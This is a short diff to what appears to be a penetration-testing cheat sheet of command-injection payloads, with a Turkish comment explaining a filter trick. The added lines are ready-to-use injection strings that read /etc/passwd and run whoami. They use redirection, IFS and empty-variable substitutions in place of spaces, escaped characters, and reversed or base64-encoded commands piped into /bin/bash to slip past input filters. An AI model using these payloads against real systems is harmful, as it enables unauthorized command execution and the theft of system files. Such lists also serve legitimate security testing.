@@ -129,7 +129,13 @@ ${@system(ls)} //filter bypass
 & whoami
 &.& whoami
 || whoami
-
+&cat</etc/passwd // küçüktür işareti boşluk yerine geçebilir.
+|cat</etc/passwd
+&cat$(IFS)/etc/passwd 
+|cat$u/etc$u/passwd
+www.google.com|w\ho\ami
+|echo imaohw|rev| 2>&1 /bin/bash
+&echo 'imaohw' | rev | base64 | base64 --decode | 2>&1 /bin/bash
 
 ----------------------------------------------
 # SQL Injection (manual)
